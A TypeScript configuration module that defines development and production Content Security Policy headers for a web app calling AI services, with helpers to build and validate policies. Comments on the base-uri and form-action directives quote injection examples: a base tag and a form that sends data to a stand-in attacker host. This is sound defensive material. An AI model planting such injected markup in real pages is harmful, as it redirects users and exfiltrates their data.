/**
 * Content Security Policy (CSP) Configuration
 *
 * This file contains centralized CSP policy definitions for development and production
 * environments. Based on CSP Policy Design document (Task 020, Subtasks 1.1 and 1.2).
 *
 * CSP is the primary defense against XSS (Cross-Site Scripting) attacks, controlling
 * which sources can load scripts, styles, images, and other resources.
 *
 * @see docs/security/CSP.md for full documentation
 * @see .auto-claude/specs/020-implement-content-security-policy-csp-headers/csp-policy-design.md
 */

/**
 * External Domain Configuration
 *
 * Centralized list of external domains allowed by CSP. This makes it easy to
 * add or remove domains as the application's dependencies change.
 */
export const CSP_DOMAINS = {
  /**
   * AI Service APIs
   *
   * External AI services used for content generation, image processing, and chat.
   */
  ai: {
    /** OpenRouter: AI model routing and orchestration */
    openRouter: 'https://openrouter.ai',
    /** Replicate: Image processing, upscaling, background removal */
    replicate: 'https://api.replicate.com',
    /** Replicate CDN: Delivery network for generated images */
    replicateCdn: 'https://*.replicate.delivery',
    /** Google Gemini: AI text and vision models */
    gemini: 'https://generativelanguage.googleapis.com',
    /** OpenAI: WebSocket API for real-time chat */
    openAiWebSocket: 'wss://api.openai.com',
  },

  /**
   * Google Services
   *
   * Google Fonts, Cloud Storage, and other Google infrastructure.
   */
  google: {
    /** Google Fonts: CSS stylesheet endpoint */
    fontsCss: 'https://fonts.googleapis.com',
    /** Google Fonts: Static font files CDN */
    fontsStatic: 'https://fonts.gstatic.com',
    /** Google Cloud Storage: File storage and retrieval */
    cloudStorage: 'https://storage.googleapis.com',
    /** Google Cloud Storage: User content delivery */
    userContent: 'https://*.googleusercontent.com',
  },

  /**
   * Backend and Infrastructure
   *
   * Backend API endpoints and deployment infrastructure.
   */
  backend: {
    /** Google Cloud Run: Production backend API */
    cloudRun: 'https://*.run.app',
  },

  /**
   * Development-Only Domains
   *
   * Domains used only during development (excluded from production policy).
   */
  development: {
    /** Local backend API server */
    localApi: 'http://localhost:3000',
    /** Vite HMR WebSocket connection */
    viteHmr: 'ws://localhost:5173',
    /** Placeholder image service (development testing) */
    placeholders: 'https://picsum.photos',
  },
} as const;

/**
 * CSP Directive Configuration
 *
 * Each directive controls a specific type of resource loading.
 * Directives can be customized per environment (dev vs prod).
 */
export interface CSPDirectives {
  /** Fallback for other fetch directives */
  'default-src': string[];
  /** JavaScript sources */
  'script-src': string[];
  /** CSS sources */
  'style-src': string[];
  /** Image sources (includes blob: and data: for canvas) */
  'img-src': string[];
  /** Font sources */
  'font-src': string[];
  /** API/fetch/WebSocket sources */
  'connect-src': string[];
  /** Valid parents that may embed the page (clickjacking protection) */
  'frame-ancestors': string[];
  /** Restrict URL for <base> element */
  'base-uri': string[];
  /** Restrict form submission URLs */
  'form-action': string[];
  /** Block plugins (Flash, Java, etc.) */
  'object-src': string[];
  /** Upgrade HTTP to HTTPS (production only) */
  'upgrade-insecure-requests'?: boolean;
}

/**
 * CSP Policy Configuration Object
 */
export interface CSPConfig {
  /** Policy name/description */
  name: string;
  /** Environment this policy applies to */
  environment: 'development' | 'production';
  /** CSP directives */
  directives: CSPDirectives;
  /** Additional notes about this policy */
  notes?: string[];
}

/**
 * Development CSP Policy (Permissive)
 *
 * More permissive policy for development environment to support:
 * - Vite HMR (Hot Module Replacement) - requires unsafe-inline/unsafe-eval
 * - Local development servers (localhost connections)
 * - WebSocket connections for live reload
 * - Development placeholder images
 *
 * Security Trade-offs:
 * - 'unsafe-inline' and 'unsafe-eval' in script-src: Required for Vite HMR
 * - 'unsafe-inline' in style-src: Required for React inline styles and Tailwind
 * - HTTP connections: localhost:3000 for local backend
 * - WebSocket: ws://localhost:5173 for Vite HMR
 *
 * This reduced security is acceptable in development as the environment is
 * isolated and not exposed to external threats.
 */
export const DEV_CSP_CONFIG: CSPConfig = {
  name: 'Development CSP Policy',
  environment: 'development',
  directives: {
    /**
     * default-src: 'self'
     *
     * Fallback for all other *-src directives. Restricts to same-origin only.
     * Other directives override this for their specific resource types.
     */
    'default-src': ["'self'"],

    /**
     * script-src: 'self' 'unsafe-inline' 'unsafe-eval'
     *
     * 'self': Load scripts from same origin
     * 'unsafe-inline': Allow inline <script> tags (required for Vite HMR)
     * 'unsafe-eval': Allow eval() and new Function() (required for Vite HMR)
     *
     * WARNING: unsafe-inline and unsafe-eval significantly reduce XSS protection.
     * Only acceptable in development. Production policy is strict.
     */
    'script-src': ["'self'", "'unsafe-inline'", "'unsafe-eval'"],

    /**
     * style-src: 'self' 'unsafe-inline' + Google Fonts
     *
     * 'self': Load stylesheets from same origin
     * 'unsafe-inline': Allow inline <style> and style="" attributes
     *   - Required for React inline styles (emotion, styled-components)
     *   - Required for Tailwind CSS JIT compilation in development
     * fonts.googleapis.com: Google Fonts CSS
     *
     * Note: unsafe-inline for styles is lower risk than for scripts.
     * Future: Consider using nonces or hashes to remove unsafe-inline.
     */
    'style-src': ["'self'", "'unsafe-inline'", CSP_DOMAINS.google.fontsCss],

    /**
     * img-src: 'self' blob: data: + AI CDNs + Google Storage
     *
     * 'self': Load images from same origin
     * blob:: Canvas-generated images (core feature - banner editor)
     * data:: Base64-encoded images used by AI APIs
     * AI CDNs: Replicate delivery, Google Cloud Storage
     * picsum.photos: Placeholder images for development
     *
     * blob: and data: are critical for canvas image manipulation.
     */
    'img-src': [
      "'self'",
      'blob:',
      'data:',
      CSP_DOMAINS.ai.replicateCdn,
      CSP_DOMAINS.google.userContent,
      CSP_DOMAINS.google.cloudStorage,
      CSP_DOMAINS.development.placeholders,
    ],

    /**
     * font-src: 'self' + Google Fonts
     *
     * 'self': Load fonts from same origin
     * fonts.googleapis.com: Google Fonts CSS
     * fonts.gstatic.com: Google Fonts static files (WOFF2, etc.)
     *
     * Google Fonts are loaded from their CDN for better caching and performance.
     * Alternative: Self-host fonts to remove external dependency.
     */
    'font-src': [
      "'self'",
      CSP_DOMAINS.google.fontsCss,
      CSP_DOMAINS.google.fontsStatic,
    ],

    /**
     * connect-src: 'self' + AI APIs + Backend + WebSocket
     *
     * Controls fetch(), XMLHttpRequest, WebSocket, and EventSource connections.
     *
     * 'self': API calls to same origin
     * localhost:3000: Local backend API during development
     * ws://localhost:5173: Vite HMR WebSocket
     * AI Services:
     *   - openrouter.ai: AI model routing
     *   - api.replicate.com: Image processing
     *   - generativelanguage.googleapis.com: Google Gemini
     *   - wss://api.openai.com: OpenAI real-time WebSocket
     *
     * Note: In production, localhost connections are removed.
     */
    'connect-src': [
      "'self'",
      CSP_DOMAINS.development.localApi,
      CSP_DOMAINS.development.viteHmr,
      CSP_DOMAINS.ai.openRouter,
      CSP_DOMAINS.ai.replicate,
      CSP_DOMAINS.ai.gemini,
      CSP_DOMAINS.ai.openAiWebSocket,
    ],

    /**
     * frame-ancestors: 'none'
     *
     * Prevents any domain from embedding this page in an iframe.
     * Protects against clickjacking attacks.
     *
     * Equivalent to X-Frame-Options: DENY
     *
     * Use 'self' to allow same-origin framing, or list specific domains.
     */
    'frame-ancestors': ["'none'"],

    /**
     * base-uri: 'self'
     *
     * Restricts the URLs that can be used in <base> element.
     * Prevents base tag injection attacks that could redirect relative URLs.
     *
     * 'self': Only allow same-origin base URLs
     */
    'base-uri': ["'self'"],

    /**
     * form-action: 'self'
     *
     * Restricts URLs that can be used as form submission targets.
     * Prevents form hijacking attacks that submit to attacker-controlled endpoints.
     *
     * 'self': Only allow form submissions to same origin
     */
    'form-action': ["'self'"],

    /**
     * object-src: 'none'
     *
     * Blocks all plugins (Flash, Java, Silverlight, etc.).
     * Modern web apps don't need plugins, and they're a security risk.
     *
     * 'none': No plugins allowed
     */
    'object-src': ["'none'"],

    // No upgrade-insecure-requests in development (allows http://localhost)
  },
  notes: [
    'Permissive policy for development environment',
    'Allows unsafe-inline and unsafe-eval for Vite HMR',
    'Includes localhost connections and WebSocket',
    'Production policy is much stricter',
  ],
};

/**
 * Production CSP Policy (Strict)
 *
 * Strict policy for production environment providing maximum XSS protection:
 * - NO 'unsafe-eval': Vite production builds don't require it
 * - NO 'unsafe-inline' for scripts: Maximum XSS protection
 * - 'unsafe-inline' for styles only: Required for React inline styles
 * - HTTPS/WSS-only: All connections must be secure
 * - upgrade-insecure-requests: Automatically upgrade HTTP to HTTPS
 *
 * This policy provides strong defense against:
 * - XSS (Cross-Site Scripting) attacks
 * - Clickjacking attacks
 * - Form hijacking
 * - Base tag injection
 * - Plugin-based attacks
 *
 * External services are explicitly allowlisted:
 * - 5 AI service APIs (OpenRouter, Replicate, Gemini, OpenAI, Cloud Run)
 * - 3 Google services (Fonts CSS, Fonts Static, Cloud Storage)
 * - blob: and data: URLs for canvas image manipulation
 */
export const PROD_CSP_CONFIG: CSPConfig = {
  name: 'Production CSP Policy',
  environment: 'production',
  directives: {
    /**
     * default-src: 'self'
     *
     * Fallback for all other *-src directives. Restricts to same-origin only.
     * Other directives override this for their specific resource types.
     */
    'default-src': ["'self'"],

    /**
     * script-src: 'self' ONLY
     *
     * STRICT: No unsafe-inline, no unsafe-eval
     *
     * 'self': Load scripts only from same origin
     *
     * This is the strongest XSS protection. All scripts must be in external
     * .js files served from the same origin. No inline scripts allowed.
     *
     * Vite production builds are fully compatible with this strict policy:
     * - No eval() usage in production builds
     * - All code in external .js files
     * - ES modules (type="module") work with CSP
     *
     * Future enhancement: Add nonce-based inline script support if needed
     */
    'script-src': ["'self'"],

    /**
     * style-src: 'self' 'unsafe-inline' + Google Fonts
     *
     * 'self': Load stylesheets from same origin
     * 'unsafe-inline': Allow inline <style> and style="" attributes
     *   - Required for React inline styles
     *   - Required for Tailwind CSS utility classes
     *   - Required for CSS-in-JS libraries (emotion, styled-components)
     * fonts.googleapis.com: Google Fonts CSS
     *
     * Trade-off: unsafe-inline for styles is lower security risk than for scripts.
     * CSS injection attacks are less severe than JavaScript injection.
     *
     * Future: Consider nonce-based approach to remove unsafe-inline for styles.
     */
    'style-src': ["'self'", "'unsafe-inline'", CSP_DOMAINS.google.fontsCss],

    /**
     * img-src: 'self' blob: data: + AI CDNs + Google Storage
     *
     * 'self': Load images from same origin
     * blob:: Canvas-generated images (CRITICAL - core feature)
     * data:: Base64-encoded images used by AI APIs
     * AI CDNs:
     *   - *.replicate.delivery: Replicate AI-generated images
     *   - *.googleusercontent.com: Google Cloud Storage user content
     *   - storage.googleapis.com: Direct GCS access
     *
     * blob: and data: URLs are essential for the canvas editor.
     * Without these, users cannot generate or edit banner images.
     *
     * Note: No picsum.photos in production (development only)
     */
    'img-src': [
      "'self'",
      'blob:',
      'data:',
      CSP_DOMAINS.ai.replicateCdn,
      CSP_DOMAINS.google.userContent,
      CSP_DOMAINS.google.cloudStorage,
    ],

    /**
     * font-src: 'self' + Google Fonts
     *
     * 'self': Load fonts from same origin
     * fonts.googleapis.com: Google Fonts CSS
     * fonts.gstatic.com: Google Fonts static files (WOFF2, etc.)
     *
     * Google Fonts are loaded from their CDN for:
     * - Better global caching (users may already have fonts cached)
     * - Reduced bundle size (fonts not in our build)
     * - Automatic format selection (WOFF2 for modern browsers)
     *
     * Alternative: Self-host fonts for full control and privacy.
     */
    'font-src': [
      "'self'",
      CSP_DOMAINS.google.fontsCss,
      CSP_DOMAINS.google.fontsStatic,
    ],

    /**
     * connect-src: 'self' + AI APIs + Backend (HTTPS/WSS only)
     *
     * Controls fetch(), XMLHttpRequest, WebSocket, and EventSource connections.
     *
     * 'self': API calls to same origin
     * *.run.app: Google Cloud Run backend (production)
     *
     * AI Service APIs (all HTTPS/WSS):
     *   - https://openrouter.ai: AI model routing and orchestration
     *   - https://api.replicate.com: Image processing (upscale, bg removal)
     *   - https://generativelanguage.googleapis.com: Google Gemini API
     *   - wss://api.openai.com: OpenAI real-time WebSocket
     *
     * SECURITY: No HTTP connections, only HTTPS and WSS (secure WebSocket).
     * upgrade-insecure-requests directive will upgrade any accidental HTTP.
     *
     * Note: No localhost connections in production.
     */
    'connect-src': [
      "'self'",
      CSP_DOMAINS.ai.openRouter,
      CSP_DOMAINS.ai.replicate,
      CSP_DOMAINS.ai.gemini,
      CSP_DOMAINS.ai.openAiWebSocket,
      CSP_DOMAINS.backend.cloudRun,
    ],

    /**
     * frame-ancestors: 'none'
     *
     * Prevents any domain from embedding this page in an iframe.
     * Protects against clickjacking attacks.
     *
     * Modern replacement for X-Frame-Options: DENY
     *
     * 'none': No framing allowed, even by same origin
     *
     * If you need to allow embedding:
     * - 'self': Allow same-origin framing
     * - https://trusted.example.com: Allow specific domains
     */
    'frame-ancestors': ["'none'"],

    /**
     * base-uri: 'self'
     *
     * Restricts URLs that can be used in <base> element.
     * Prevents base tag injection attacks.
     *
     * Without this, attacker could inject: <base href="https://evil.com">
     * All relative URLs would then resolve to attacker's domain.
     *
     * 'self': Only allow same-origin base URLs
     */
    'base-uri': ["'self'"],

    /**
     * form-action: 'self'
     *
     * Restricts URLs that can be used as form submission targets.
     * Prevents forms from submitting to external domains.
     *
     * Without this, attacker could inject form that exfiltrates data:
     * <form action="https://evil.com/collect" method="POST">
     *
     * 'self': Only allow form submissions to same origin
     *
     * If you need external form submissions (e.g., payment processors):
     * Add their domains: 'self' https://checkout.stripe.com
     */
    'form-action': ["'self'"],

    /**
     * object-src: 'none'
     *
     * Blocks all plugins (Flash, Java, Silverlight, ActiveX).
     *
     * Plugins are a major security risk and are deprecated in modern browsers:
     * - Flash: Disabled by default in all browsers (EOL 2020)
     * - Java applets: Removed from modern browsers
     * - Silverlight: Discontinued by Microsoft
     *
     * Modern web apps use HTML5 instead of plugins.
     *
     * 'none': No plugins allowed
     */
    'object-src': ["'none'"],

    /**
     * upgrade-insecure-requests
     *
     * Automatically upgrade HTTP requests to HTTPS.
     *
     * If any code accidentally makes an HTTP request, the browser will
     * automatically upgrade it to HTTPS before sending.
     *
     * Benefits:
     * - Prevents mixed content warnings
     * - Enforces HTTPS-only communication
     * - Catches developer mistakes (hardcoded http:// URLs)
     *
     * This is a boolean directive (no value, just presence).
     *
     * Only included in production (development uses http://localhost).
     */
    'upgrade-insecure-requests': true,
  },
  notes: [
    'Strict policy for production environment',
    'NO unsafe-eval (Vite production builds are compatible)',
    'NO unsafe-inline for scripts (maximum XSS protection)',
    'HTTPS/WSS-only connections',
    'Automatic HTTP to HTTPS upgrade',
  ],
};

/**
 * Convert CSP directives object to policy string
 *
 * Converts the structured directive object into a CSP header string format.
 *
 * @param directives - CSP directives configuration
 * @returns Formatted CSP policy string for use in headers
 *
 * @example
 * const policy = buildCSPString(PROD_CSP_CONFIG.directives);
 * // Returns: "default-src 'self'; script-src 'self'; ..."
 */
export function buildCSPString(directives: CSPDirectives): string {
  const parts: string[] = [];

  // Process each directive
  Object.entries(directives).forEach(([key, value]) => {
    if (key === 'upgrade-insecure-requests') {
      // Boolean directive - include if true
      if (value === true) {
        parts.push('upgrade-insecure-requests');
      }
    } else if (Array.isArray(value)) {
      // Array directive - join sources with spaces
      parts.push(`${key} ${value.join(' ')}`);
    }
  });

  // Join all directives with semicolon separator
  return parts.join('; ');
}

/**
 * Get CSP policy string for environment
 *
 * Returns the appropriate CSP policy based on the environment.
 *
 * @param environment - Environment name (development, production, etc.)
 * @returns CSP policy string ready for header
 *
 * @example
 * const policy = getCSPForEnvironment('production');
 * response.setHeader('Content-Security-Policy', policy);
 */
export function getCSPForEnvironment(environment: string): string {
  const isDevelopment = environment === 'development' || environment === 'dev';
  const config = isDevelopment ? DEV_CSP_CONFIG : PROD_CSP_CONFIG;
  return buildCSPString(config.directives);
}

/**
 * Add a new domain to CSP configuration
 *
 * Helper function to add domains to existing CSP configuration.
 * Useful for dynamic configuration or runtime domain additions.
 *
 * @param config - Existing CSP configuration
 * @param directive - Directive to add domain to (e.g., 'connect-src')
 * @param domain - Domain to add (e.g., 'https://newapi.example.com')
 * @returns New CSP configuration with added domain
 *
 * @example
 * const updatedConfig = addDomain(
 *   PROD_CSP_CONFIG,
 *   'connect-src',
 *   'https://newapi.example.com'
 * );
 */
export function addDomain(
  config: CSPConfig,
  directive: keyof CSPDirectives,
  domain: string
): CSPConfig {
  // Create a deep copy of the config
  const newConfig = JSON.parse(JSON.stringify(config)) as CSPConfig;

  // Add domain if directive exists and is an array
  const directiveValue = newConfig.directives[directive];
  if (Array.isArray(directiveValue) && !directiveValue.includes(domain)) {
    directiveValue.push(domain);
  }

  return newConfig;
}

/**
 * Validate CSP configuration
 *
 * Checks if CSP configuration follows best practices and security requirements.
 *
 * @param config - CSP configuration to validate
 * @returns Object with validation result and any warnings
 *
 * @example
 * const validation = validateCSP(PROD_CSP_CONFIG);
 * if (!validation.valid) {
 *   console.warn('CSP issues:', validation.warnings);
 * }
 */
export function validateCSP(config: CSPConfig): {
  valid: boolean;
  warnings: string[];
} {
  const warnings: string[] = [];

  // Check for unsafe-eval in production
  if (
    config.environment === 'production' &&
    config.directives['script-src']?.includes("'unsafe-eval'")
  ) {
    warnings.push(
      "Production policy should not include 'unsafe-eval' in script-src"
    );
  }

  // Check for missing default-src
  if (!config.directives['default-src']) {
    warnings.push('Missing default-src directive (recommended)');
  }

  // Check for missing frame-ancestors
  if (!config.directives['frame-ancestors']) {
    warnings.push('Missing frame-ancestors directive (recommended for clickjacking protection)');
  }

  // Check for wildcard in script-src
  if (config.directives['script-src']?.some((src) => src.includes('*'))) {
    warnings.push("Wildcard (*) in script-src is risky, use specific domains");
  }

  return {
    valid: warnings.length === 0,
    warnings,
  };
}

/**
 * Export pre-built policy strings for convenience
 *
 * These are ready-to-use CSP policy strings that can be directly used
 * in headers without calling buildCSPString().
 */
export const CSP_POLICIES = {
  /** Development policy string (permissive) */
  development: buildCSPString(DEV_CSP_CONFIG.directives),
  /** Production policy string (strict) */
  production: buildCSPString(PROD_CSP_CONFIG.directives),
} as const;

/**
 * Export configuration objects for advanced usage
 */
export const CSP_CONFIGS = {
  development: DEV_CSP_CONFIG,
  production: PROD_CSP_CONFIG,
} as const;

task_intent.title: Implement Content Security Policy (CSP) Headers
task_intent.description: Add comprehensive Content Security Policy headers to protect against XSS attacks while allowing the application to function with external AI services and dynamic content.
